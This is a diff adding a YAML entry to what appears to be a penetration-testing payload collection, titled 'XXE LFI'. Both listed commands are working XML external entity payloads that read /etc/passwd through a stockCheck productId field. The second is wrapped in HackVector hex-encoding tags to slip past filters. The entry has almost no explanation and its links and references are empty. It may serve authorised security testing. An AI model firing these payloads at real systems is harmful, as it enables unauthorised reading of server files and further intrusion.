@@ -1,0 +1,27 @@
+name: XXE LFI
+description:
+commands:
+  - command: |
+      <?xml version="1.0" encoding="UTF-8"?> 
+      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
+      <stockCheck>
+          <productId>&xxe;</productId>
+      </stockCheck>
+    description: LFI with inline XXE
+  - command: |
+      <?xml version="1.0" encoding="UTF-8"?> 
+      <@hex_entities>
+      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
+      <@hex_entities>
+      <stockCheck>
+          <productId>&xxe;</productId>
+      </stockCheck>
+    description: HEX encoded command with HackVector
+tags:
+  - xxe
+  - lfi
+show:
+links:
+  -
+references:
+  -
